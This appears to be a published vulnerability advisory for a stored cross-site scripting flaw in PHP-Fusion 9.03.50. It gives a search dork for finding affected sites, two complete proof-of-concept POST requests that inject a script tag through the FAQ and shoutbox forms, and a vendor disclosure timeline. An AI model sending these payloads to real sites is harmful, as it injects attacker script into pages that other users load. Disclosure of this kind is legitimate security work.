@@ -1,0 +1,102 @@
+# Exploit Title: php-fusion 9.03.50 - Persistent Cross-Site Scripting
+# Google Dork: "php-fusion"
+# Date: 2020-04-30
+# Exploit Author: SunCSR (Sun* Cyber Security Research)
+# Vendor Homepage: https://www.php-fusion.co.uk/
+# Software Link: https://www.php-fusion.co.uk/infusions/downloads/downloads.php?cat_id=30
+# Version: 9.03.50
+# Tested on: Windows
+# CVE : N/A
+
+### Vulnerability : Persistent Cross-Site Scripting
+
+###Describe the bug
+Persistent Cross-site scripting (Stored XSS) vulnerabilities in PHP-Fusion 9.03.50 allow remote attackers to inject arbitrary web script or HTML
+via the go parameter to /infusions/faq/faq_admin.php, /infusions/shoutbox_panel/shoutbox_admin.php
+
+###To Reproduce
+Steps to reproduce the behavior:
+Authenticated user submit Q&A or Shoutbox to admin
+
+### POC:
+## Submit Q&A:
+
+POST /php-fusion/submit.php?stype=q HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------68756068726681644952075211938
+Content-Length: 1146
+Origin: http://TARGET
+DNT: 1
+Connection: close
+Referer: http://TARGET/php-fusion/submit.php?stype=q
+Cookie: xxx
+Upgrade-Insecure-Requests: 1
+
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="fusion_token"
+
+2-1588232750-f839ed0754d5dc8aa577cfb660e273e711ec03a9a782de90ac34860cdb45a8f1
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="form_id"
+
+submit_form
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="fusion_PR57qY"
+
+
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="faq_question"
+
+Question XSS
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="faq_answer"
+
+xss</textarea><ScRiPt>alert('XSS')</ScRiPt>
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="faq_cat_id"
+
+1
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="faq_language[]"
+
+English
+-----------------------------68756068726681644952075211938
+Content-Disposition: form-data; name="submit_link"
+
+Submit
+-----------------------------68756068726681644952075211938--
+
+## Shoutbox
+
+POST /php-fusion/infusions/downloads/downloads.php?cat_id=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 272
+Origin: http://TARGET
+DNT: 1
+Connection: close
+Referer: http://TARGET/php-fusion/infusions/downloads/downloads.php?cat_id=1
+Cookie: xxx
+Upgrade-Insecure-Requests: 1
+
+fusion_token=2-1588233429-3df5ba2b9c690e833548645f66a7772cf7fdb24ca9be130d5ff01e26351a2771&form_id=sbpanel&fusion_gEHiPs=&shout_id=0
+&shout_hidden=&shout_message=xss</textarea><ScRiPt>alert('XSS')</ScRiPt>&shout_language=English&shout_box=Save+Shout
+
+
+###Reference:
+https://github.com/php-fusion/PHP-Fusion/issues/2306
+
+### History
+=============
+2020-04-09  Issue discovered
+2020-04-14  Vendor contacted
+2020-04-28  Vendor response and hotfix
+2020-04-29  Vendor releases fixed
